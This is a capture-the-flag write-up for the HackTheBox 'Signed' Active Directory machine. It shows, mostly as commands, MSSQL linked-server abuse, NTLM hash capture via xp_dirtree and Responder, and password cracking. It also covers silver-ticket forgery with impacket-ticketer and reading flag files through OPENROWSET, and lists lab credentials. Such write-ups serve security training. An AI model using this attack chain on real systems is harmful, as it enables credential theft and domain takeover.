# Signed — HackTheBox

**Category:** Windows / Active Directory  
**Difficulty:** Medium

---

## starting creds

```
scott : Sm230#C5NatH  (MSSQL)
```

---

## nmap

```
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00
```

---

## enumeration

connected using:

```bash
impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90
```

```
enum_impersonate --> nothing
enum_logins --> another user named sa who is sysadmin
enum_links --> DC01 is linked to DC01 (interesting)
xp_dirtree --> shows nothing
xp_cmdshell --> no permission
```

there are 4 databases:

```
master                   0   
tempdb                   0   
model                    0   
msdb                     1
```

we cant access model

doing:

```sql
SELECT * FROM OPENQUERY(DC01, 'SELECT SYSTEM_USER as CurrentUser, USER_NAME() as DatabaseUser');
```

to see if we can fetch data through the linked server — showed `Server 'DC01' is not configured for DATA ACCESS.`

```sql
EXEC sp_helpserver @server = 'DC01';
```

we saw rpc is enabled

```sql
EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT DC01;
```

didnt work but:

```sql
EXEC DC01.master.dbo.sp_who;
```

worked — it means that we can execute commands at higher privilege without the AT clause because AT creates a new connection from local SQL server to the linked server where scott might not be a user. whereas without AT clause it uses the pre-existing linked server to access it which means we are accessing as the sql service account.

one thing i noticed is that msdb is owned by sa and we are trustworthy in it

```sql
EXEC DC01.master.dbo.sp_executesql N'SELECT DISTINCT OBJECT_NAME(major_id) as ProcedureName 
FROM sys.database_permissions 
WHERE class = 1 
AND permission_name = ''EXECUTE'' 
AND grantee_principal_id = DATABASE_PRINCIPAL_ID(''public'') 
ORDER BY ProcedureName;';
```

listed all procedures executable by public on the linked server and found some critical things:

```
xp_regread (registry access)
xp_dirtree (file system)
xp_fileexist (file checking)
xp_msver (system info)
```

```sql
EXEC DC01.master.dbo.xp_regread "HKEY_LOCAL_MACHINE", "SYSTEM\CurrentControlSet\Services\MSSQLSERVER", "ObjectName";
```

showed `ObjectName : SIGNED\mssqlsvc`

---

## foothold

as we had xp_dirtree enabled we used it to access our share in smb and got the ntlm hash as ports 445 and 139 were filtered

summarising what we did till yet cuz i did a little overkill:

```
1. 1433/tcp open with creds for it
2. port 445 and 139 were filtered means it would be accessible from the internal network
3. in mssql we had xp_dirtree priv so we turned responder on and used xp_dirtree to get ntlm hash
4. cracked the ntlm hash --> purPLE9795!@
5. port for winrm is also filtered
```

logging in with cracked creds:

```bash
impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
```

after doing `enum_impersonate` we found we can impersonate dc_admin
also using `xp_dirtree` we can see the filesystem
doing `enum_logins` we found IT group has sysadmin privs

---

## privilege escalation — silver ticket

now going to forge silver ticket:

```bash
# ntlm hash
echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
# --> ef699384c3285c54128a3ee1ddb1a0cc
```

```
sid  --> S-1-5-21-4088429403-1159899800-2753317549
spn  --> MSSQLSvc/DC01.SIGNED.HTB
user RID  --> 1103
group RID --> 1105
```

```bash
impacket-ticketer \
  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
  -domain SIGNED.HTB \
  -spn "MSSQLSvc/DC01.SIGNED.HTB" \
  -groups 1105 \
  -user-id 1103 \
  mssqlsvc
```

saved in `mssqlsvc.ccache`

```bash
export KRB5CCNAME=$(pwd)/mssqlsvc.ccache
```

then finally:

```bash
impacket-mssqlclient -k 'SIGNED.HTB/mssqlsvc@dc01.signed.htb' -no-pass -windows-auth
```

reading flags:

```sql
-- user flag
SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS t;

-- root flag
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
```

as OPENROWSET(BULK) runs with the privs of the Servers account and not of the users account and our OPENROWSET worked because our server account had domain admins privileges which we included when making the silver ticket

---

## proof

![root](../proofs/signed.png)
